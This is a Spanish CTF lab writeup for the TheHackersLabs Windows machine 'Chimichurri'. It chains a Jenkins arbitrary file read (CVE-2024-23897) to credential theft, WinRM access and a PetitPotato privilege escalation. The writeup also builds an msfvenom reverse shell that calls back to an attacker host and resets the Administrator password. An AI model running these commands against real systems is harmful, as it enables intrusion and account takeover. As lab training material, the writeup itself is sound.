---
title: "Chimichurri"
date: 2025-03-16 00:00:00 +0800
categories: writeups thehackerslabs
tags: máquina windows AD jenkins cve lfi
description: Writeup de la máquina Chimichurri de TheHackersLabs.
image: ../assets/images/posts/logos/thehackerslabs.png
---

## Resumen de la resolución

**Chimichurri** es un máquina **Windows** de dificultad **Principiante** (**Easy**) de la plataforma **TheHackersLabs**. En ella, se compromete a través de una vulnerabilidad en **Jenkins** (CVE-2024-23897) donde la aprovecharemos para leer las credenciales del usuario **hacker**. Finalmente, elevaremos nuestros privilegios abusando de con **SeImpersonatePrivilege** usando **PetitPotato**.

___
## Enumeración

En primer lugar, realizaremos un barrido en la red para encontrar la **Dirección IP** de la máquina víctima, para ello usaremos el siguiente comando.

```bash
arp-scan -I ens33 --localnet
```

A continuación podemos ver la **Dirección IP** ya que el **OUI** es **08:00:27**, correspondiente a una máquina virtual de **Virtual Box**.

![](<../../images/Pasted image 20250307121807.png>)

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../../images/Pasted image 20250307121846.png>)
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 192.168.200.4 -oG allPorts
```

Observamos como nos reporta que nos encuentran un montón de puertos abiertos, como es común en las máquinas windows.

![](<../../images/Pasted image 20250307121936.png>)

Ahora gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49669,49670,49671,49681,49688,49694 -sCV 192.168.200.4 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará la atención es que está abierto el puerto **88** (**Kerberos**), el **139 y 445** (**SMB**) y en el puerto **6969** (**HTTP**) parece estar alojada una página web.

![](<../../images/Pasted image 20250307122302.png>)

___
### Puerto 139,445 - SMB (Samba)

Gracias al siguiente comando de **netexec** para conocer más información sobre la máquina vícitma.

```bash
netexec smb 192.168.200.4
```

 Veremos que estamos ante un entorno de directorio activo (**AD**), y el dominio de la máquina víctima (`chimichurri.thl`)

![](<../../images/Pasted image 20250307123041.png>)

En este punto lo que debemos de hacer es añadir al `/etc/hosts` la siguiente línea `192.168.200.4 chimichurri.thl CHIMICURRI.chimichurri.thl CHIMICHURRI`.

A continuación, pasaremos a listar los recursos compartidos de **SMB**, usando el siguiente comando. 

```bash
netexec smb 192.168.200.4 -u='guest' -p='' --shares
```

Entre todos los recursos que nos encuentra, nos llamará atención el llamado `drogas`.

![](<../../images/Pasted image 20250307123240.png>)

Usando **smbclient**, identificamos un archivo `credenciales.txt` que puede contener información valiosa.

![](<../../images/Pasted image 20250307123328.png>)

El contenido del archivo `crendenciales.txt` es el siguiente, en él nos está diciendo que busquemos por el archivo `perico.txt` en el directorio home del usuario **hacker** (`C:\Users\hacker\Desktop`).

```
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
```
### Puerto 6969 - HTTP (Jetty)

Una vez terminado de enumerar el **SMB**, pasaremos a enumerar la página web del puerto **6969**, la cual tiene el siguiente aspecto.

![](<../../images/Pasted image 20250307161046.png>)

En la parte inferior derecha, veremos que la versión de **Jenkins** es la **2.361.4**.

![](<../../images/Pasted image 20250307161008.png>)

Gracias a la siguiente página web [Jenkins 2.361.4](https://www.cybersecurity-help.cz/vdb/jenkins/jenkins/2.361.4/), veremos que existen diversos exploits para dicha versión, pero el que nos llamará la atención es el que pone `Exploited` donde explotaremos un **Arbitrary File Read**.

![](<../../images/Pasted image 20250307161323.png>)

___
## Explotación
### CVE-2024-23897 | Jenkins (Arbitrary File Read)
#### Automated

En el caso de que queramos explotarlo de manera automatizada nos clonaremos el siguiente repositorio [CVE-2024-23897 - Pinguino de Mario](https://github.com/Maalfer/CVE-2024-23897), y ejecutaremos el script de la siguiente forma.

```python
python3 CVE-2024-23897.py 192.168.200.4 6969 /windows/system32/drivers/etc/hosts
```

Al ejecutar el exploit, veremos como somo capaces de leer archivos locales.

![](<../../images/Pasted image 20250307161908.png>)
#### Manual

Gracias al siguiente foro [HackTheBox - CVE-2024-23897](https://www.hackthebox.com/blog/cve-2024-23897), veremos como explotar esta vulnerabilidad de manera manual.

En primer lugar, debemos descargarnos el `jenkins-cli.jar`. Para ello, usaremos el siguiente comando.

```bash
wget http://192.168.200.4:6969/jnlpJars/jenkins-cli.jar
```

En segundo y último lugar, ejecutaremos el siguiente comando y en el último argumento especificaremos el fichero que queremos leer.

```bash
java -jar jenkins-cli.jar -s http://192.168.200.4:6969/ connect-node "@/windows/system32/drivers/etc/hosts"
```

Observamos como igualmente somos capaces de leer archivos internos del sistema.

![](<../../images/Pasted image 20250307162700.png>)

Si recordamos el contenido del fichero `credentiales.txt`, nos decía que las credenciales del usuario **hacker** se encuentran en `C:\Users\hacker\Desktop\perico.txt`. Teniendo esto en cuenta, leeremos el contenido de dicho fichero usando el siguiente comando.

```bash
java -jar jenkins-cli.jar -s http://192.168.200.4:6969/ connect-node "@/users/hacker/desktop/perico.txt"
```

Tal y como se aprecia, veremos unas credenciales **hacker:Perico69**.

![](<../../images/Pasted image 20250307230910.png>)

Gracias al siguiente comando, comprobaremos si las credenciales obtenidas nos sirven para conectarnos de manera remota a la máquina víctima, o lo que es lo mismo si el usuario **hacker** forma parte del grupo **Remote Management Users**.

```bash
netexec winrm 192.168.200.4 -u='hacker' -p='Perico69'
```

Veremos que efectivamente podemos conectarnos a la máquina víctima con las credenciales **hacker:Perico69**.

![](<../../images/Pasted image 20250307231023.png>)

Para conectarnos a la máquina víctima, usaremos **evil-winrm** de la siguiente forma.

```bash
evil-winrm -i 192.168.200.4 -u 'hacker' -p 'Perico69'
```

Tal y como vemos a continuación, hemos conseguido ganar acceso a la máquina víctima como el usuario **hacker**.

![](<../../images/Pasted image 20250307231329.png>)

___
## Escalada de privilegios
### Enumeración local

Listaremos nuestros permisos con `whoami /priv`, y nos llamará la atención el de **SeImporsonatePrivilege**.

![](<../../images/Pasted image 20250307231403.png>)
### SeImpersonatePrivilege

En el siguiente artículo [SeImpersonatePrivilege](https://books.spartan-cybersec.com/cpad/post-explotacion-en-windows/abusando-de-los-privilegios-seimpersonateprivilege-seassignprimarytokenprivilege), podemos encontrar una buena explicación de como abusar de este privilegio.

1. En primer lugar, debemos de descargarnos el siguiente binario, [PetitePotato](https://github.com/wh0amitz/PetitPotato).

2. En segundo lugar, creamos el directorio para trabajar más cómodamente.

```ps
mkdir c:\temp
cd c:\temp
```

3. En tercer lugar, subiremos el binario (**PetitPotato.exe**) a la máquina víctima, para realizar esta operativa usaremos el comando `upload PetitPotato`, propio de **Evil-WinRM** .

![](<../../images/Pasted image 20250307231726.png>)

4. En cuarto lugar, ejecutaremos el **PetitPotate.exe** de la siguiente forma.

```ps
./PetitPotato.exe 3 "whoami"
```

Tal y como se ve en la captura de pantalla, hemos conseguido convertirnos en el máximo usuario (**nt authority\system**).

![](<../../images/Pasted image 20250307231828.png>)

En este punto lo que haremos será crearemos una **Reverse Shell**. Para ello, usaremos **msfvenom** de **Metasploit** de la siguiente forma.

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.200.128 LPORT=443 -f exe -o shell.exe
```

Subiremos la **Reverse Shell** (`shell.exe`) de la misma forma que hemos hecho antes (`upload shell.exe`).

![](<../../images/Pasted image 20250307232017.png>)

5. En quinto y último lugar, nos pondremos en escucha con **NetCat** (`rlwrap nc -nlvp 443`) y ejecutaremos la **Reverse Shell** usando **PetitPotato.exe** de la siguiente forma.

```bash
./PetitPotato.exe 3 shell.exe
```

![](<../../images/Pasted image 20250307232605.png>)

Veremos que conseguimos una **Reverse Shell** como el máximo usuario (**nt authority\sytem**).

![](<../../images/Pasted image 20250307232142.png>)

Veremos que no podemos leer ninguna flag.

![](<../../images/Pasted image 20250307232249.png>)

Listaremos los permisos de las flags (`user.txt` y `flag.txt`) usando el siguiente comando.

```ps
icals <archivo>
```

Veremos que el motivo por el cual no podemos leer las flags es que solo el usuario **Administrador** tiene permiso para hacerlo.

![](<../../images/Pasted image 20250307232427.png>)

Para poder convertirnos en el usuario **Adminsitrador**, debemos de cambiarle la contraseña usando el siguiente comando.

```ps
net user administrador Trr0r123
```

La contraseña se ha cambiado exitosamente.

![](<../../images/Pasted image 20250307232650.png>)

Nos conectaremos como el usuario **Adminsitrador** haciendo uso de **evil-winrm**.

```bash
evil-winrm -i 192.168.200.4 -u 'administrador' -p 'Trr0r123'
```

Finalmente, veremos que ahora si que podemos leer las flags.

![](<../../images/Pasted image 20250307232811.png>)